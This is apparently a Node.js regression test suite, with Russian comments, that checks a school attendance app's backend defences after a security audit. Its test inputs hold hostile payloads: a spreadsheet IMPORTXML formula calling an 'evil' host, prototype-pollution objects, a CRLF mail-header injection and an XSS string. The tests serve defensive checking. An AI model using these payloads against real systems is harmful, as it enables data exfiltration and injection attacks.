// Регрессионные тесты по итогам аудита безопасности: атаки от анонима, от допущенного посетителя и от подсунутого файла.
import test from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { makeEnv, seed } from './helpers.mjs';
import { makeSandbox, call, run } from '../helpers/gas-sandbox.mjs';
import { exportData } from '../../js/domain/backup.js';
import { roundView } from '../../js/domain/rounds.js';
import { encryptJson, decryptJson } from '../../js/domain/crypto-box.js';
import { todayISO } from '../../js/domain/dates.js';

const sha = (t) => crypto.createHash('sha256').update(t).digest('hex');
const today = todayISO();

async function world() {
  const sb = makeSandbox();
  const token = run(sb, 'setup()');
  const post = (o) => call(sb, 'doPost', { postData: { contents: typeof o === 'string' ? o : JSON.stringify(o) } });
  const env = await makeEnv();
  await seed(env, 2);
  assert.equal(post({ type: 'live', action: 'seed', token, data: exportData(env.S()) }).ok, true);
  const dev = 'v'.repeat(32);
  post({ type: 'access', action: 'request', deviceHash: sha(dev), name: 'Посетитель', note: '' });
  post({ type: 'access', action: 'decide', token, id: sha(dev).slice(0, 12), decision: 'allow', role: 'admin' }); // устройство-администратор
  const udev = 'u'.repeat(32);
  post({ type: 'access', action: 'request', deviceHash: sha(udev), name: 'Дежурный', note: '' });
  post({ type: 'access', action: 'decide', token, id: sha(udev).slice(0, 12), decision: 'allow' }); // обычный пользователь
  const state = () => JSON.parse(call(sb, 'doGet', { parameter: { action: 'backup', token } }).backup);
  const visitor = (batches) => post({ type: 'live', action: 'push', device: dev, baseRev: 1, batches });
  const owner = (batches) => post({ type: 'live', action: 'push', token, baseRev: 1, batches });
  const user = (batches) => post({ type: 'live', action: 'push', device: udev, baseRev: 1, batches });
  return { sb, token, post, env, state, visitor, owner, user, dev, udev };
}

test('аудит: аноним ничего не читает и не пишет (без токена и без допуска)', async () => {
  const w = await world();
  const stranger = 'z'.repeat(32);
  for (const body of [
    { type: 'live', action: 'pull', sinceRev: -1, device: stranger },
    { type: 'live', action: 'push', baseRev: 1, batches: [{ clear: ['students'] }], device: stranger },
    { type: 'live', action: 'seed', data: {}, device: stranger },
    { type: 'live', action: 'sheets', sheets: {}, device: stranger },
    { type: 'access', action: 'list' },
    { type: 'access', action: 'decide', id: 'aaaaaaaaaaaa', decision: 'allow' },
    { type: 'lyceum-sync', sheets: { 'Ученики': { header: ['x'], rows: [] } } },
  ]) {
    const r = w.post(body);
    assert.equal(r.ok, false, JSON.stringify(body).slice(0, 60));
    assert.ok(['forbidden', 'auth'].includes(r.error), r.error);
  }
  assert.equal(call(w.sb, 'doGet', { parameter: { action: 'backup' } }).error, 'auth');
  assert.equal(w.state().students.length, 30);
});

test('аудит: устройство-администратор не может очистить или массово удалить базу, владелец может', async () => {
  const w = await world();
  const clear = w.visitor([{ put: {}, del: {}, clear: ['students', 'enrollments'], settings: {} }]);
  assert.equal(clear.rejected, 1);
  assert.equal(w.state().students.length, 30, 'база цела');
  const ids = w.state().students.map((s) => s.id);
  const many = Array.from({ length: 60 }, (_, i) => 'x' + i);
  const bigDel = w.visitor([{ put: {}, del: { students: many }, clear: [], settings: {} }]);
  assert.equal(bigDel.rejected, 1, 'массовое удаление отклонено');
  const fine = w.visitor([{ put: {}, del: { students: [ids[0]] }, clear: [], settings: {} }]);
  assert.equal(fine.applied, 1, 'обычное удаление одной записи разрешено');
  const ownerClear = w.owner([{ put: {}, del: {}, clear: ['rounds'], settings: {} }]);
  assert.equal(ownerClear.applied, 1, 'владельцу очистка разрешена');
});

test('аудит: ограничения размера (запись, число операций, запрос, база)', async () => {
  const w = await world();
  const huge = w.visitor([{ put: { students: [{ id: 'big', lastName: 'x'.repeat(30000) }] }, del: {}, clear: [], settings: {} }]);
  assert.equal(huge.rejected, 1, 'запись больше 20 000 знаков отклонена');
  const many = w.visitor([{ put: { students: Array.from({ length: 6000 }, (_, i) => ({ id: 's' + i, lastName: 'q' })) }, del: {}, clear: [], settings: {} }]);
  assert.equal(many.rejected, 1, 'больше 5000 записей за раз — отклонено');
  const body = w.post(JSON.stringify({ type: 'live', action: 'push', device: w.dev, batches: [], pad: 'x'.repeat(3100000) }));
  assert.equal(body.error, 'too-big', 'запрос больше 3 МБ отклонён');
  assert.equal(w.state().students.length, 30);
});

test('аудит: записи обхода проверяются строго (дата, место, причина), прототип не загрязняется', async () => {
  const w = await world();
  const bad = (rec) => w.visitor([{ put: { rounds: [rec] }, del: {}, clear: [], settings: {} }]).rejected;
  assert.equal(bad({ id: 'a', date: 'не-дата', studentId: 's', place: 'home' }), 1);
  assert.equal(bad({ id: 'a', date: today, studentId: 's', place: '__proto__' }), 1);
  assert.equal(bad({ id: 'a', date: today, studentId: 's', place: 'home', reason: 'я'.repeat(500) }), 1);
  assert.equal(bad({ id: 'a', date: today, studentId: 5, place: 'home' }), 1);
  const real = w.state().students[0].id;
  assert.equal(w.visitor([{ put: { rounds: [{ id: `${today}:${real}`, date: today, studentId: real, place: 'home', reason: 'ок' }] }, del: {}, clear: [], settings: {} }]).applied, 1);
  assert.equal(w.visitor([{ put: { rounds: [{ id: `${today}:нет-такого`, date: today, studentId: 'нет-такого', place: 'home' }] }, del: {}, clear: [], settings: {} }]).rejected, 1, 'отметка несуществующего ученика отклонена');
  w.visitor([{ put: { students: [{ id: '__proto__', lastName: 'x' }] }, del: { students: ['constructor'] }, clear: [], settings: JSON.parse('{"__proto__":{"polluted":1}}') }]);
  assert.equal(({}).polluted, undefined);
  // клиент тоже игнорирует чужую запись с неизвестным местом
  const env = await makeEnv();
  await seed(env, 1);
  const sid = env.S().students[0].id;
  await env.store.commit({ put: { rounds: [{ id: `${today}:${sid}`, date: today, studentId: sid, place: '__proto__' }] }, del: {} }, { system: true });
  assert.equal(roundView(env.S(), today).totals.marked, 0);
});

test('аудит: листы таблицы от устройства очищаются (формулы — только текст, объекты и гигантские ячейки отбрасываются)', async () => {
  const w = await world();
  const r = w.post({ type: 'live', action: 'sheets', device: w.dev, sheets: {
    'Ученики': { header: ['A', 'B'], rows: [['=IMPORTXML("http://evil","//x")', { a: 1 }], [['вложенный'], 'z'.repeat(60000)], ...Array.from({ length: 4000 }, () => ['1', '2'])] },
    'Левый лист': { header: ['x'], rows: [['y']] },
    'Отчёт': { header: [], rows: [['нет заголовка']] },
  } });
  assert.equal(r.ok, true);
  assert.equal(r.written['Ученики'], 3000, 'не больше 3000 строк');
  assert.equal(w.sb.sheets.has('Левый лист'), false, 'посторонние листы не создаются');
  assert.equal('Отчёт' in r.written, false, 'лист без заголовка пропущен');
  const sh = w.sb.sheets.get('Ученики');
  const cells = Object.values(sh.cells);
  assert.ok(cells.every((v) => typeof v === 'number' || typeof v === 'string'), 'только числа и строки');
  assert.ok(cells.every((v) => String(v).length <= 500), 'ячейка не длиннее 500 знаков');
  assert.ok(sh.formats.flat().every((f) => f === '@' || f === '0'), 'текстовый формат: формулы не вычисляются');
});

test('аудит: спам запросами доступа — таблица не блокируется, письма ограничены, перевод строки в теме не проходит', async () => {
  const w = await world();
  for (let i = 0; i < 40; i++) w.post({ type: 'access', action: 'request', deviceHash: sha('spam' + i), name: `Spam${i}\r\nBcc: evil@x`, note: '<img src=x onerror=alert(1)>' });
  assert.ok(w.sb.mails.length <= 5, `писем не больше 5 в час (было ${w.sb.mails.length})`);
  assert.ok(w.sb.mails.every((m) => !/[\r\n]/.test(m[1])), 'в теме письма нет переводов строк');
});

test('аудит: заполненная таблица заявок не блокирует новых людей — вытесняются старые недопущенные, допущенные остаются', async () => {
  const w = await world();
  const sh = w.sb.sheets.get('_Доступ');
  for (let i = 0; i < 520; i++) sh.appendRow([sha('old' + i), 'Старый' + i, '', 'denied', '2020-01-01T00:00:00.000Z', '', '2020-01-01T00:00:00.000Z']);
  const r = w.post({ type: 'access', action: 'request', deviceHash: sha('new-one'), name: 'Новый Человек', note: '' });
  assert.equal(r.ok, true, 'новая заявка принимается и при заполненной таблице');
  const list = w.post({ type: 'access', action: 'list', token: w.token }).requests;
  assert.ok(list.some((x) => x.name === 'Посетитель' && x.status === 'allowed'), 'допущенный посетитель не вытеснен');
});

test('аудит: ошибки не раскрывают внутренности, мусорный запрос не роняет скрипт', async () => {
  const w = await world();
  assert.deepEqual(w.post('не json'), { ok: false, error: 'bad-request' });
  assert.deepEqual(w.post('null'), { ok: false, error: 'bad-request' });
  assert.equal(w.post('[]').ok, false);
});

test('аудит: зашифрованный файл с подсунутыми параметрами отклоняется сразу (нельзя подвесить браузер)', async () => {
  const box = await encryptJson({ a: 1 }, 'пароль-для-теста-1234', { iterations: 100000 });
  assert.deepEqual(await decryptJson(box, 'пароль-для-теста-1234'), { a: 1 });
  const t0 = Date.now();
  await assert.rejects(() => decryptJson({ ...box, iter: 2_000_000_000 }, 'x'), /недопустимые параметры/);
  await assert.rejects(() => decryptJson({ ...box, iter: 999 }, 'x'), /недопустимые параметры/);
  await assert.rejects(() => decryptJson({ ...box, iter: '600000' }, 'x'), /недопустимые параметры/);
  await assert.rejects(() => decryptJson({ ...box, salt: 5 }, 'x'), /повреждён/);
  assert.ok(Date.now() - t0 < 2000, 'отказ мгновенный, без подбора ключа');
});
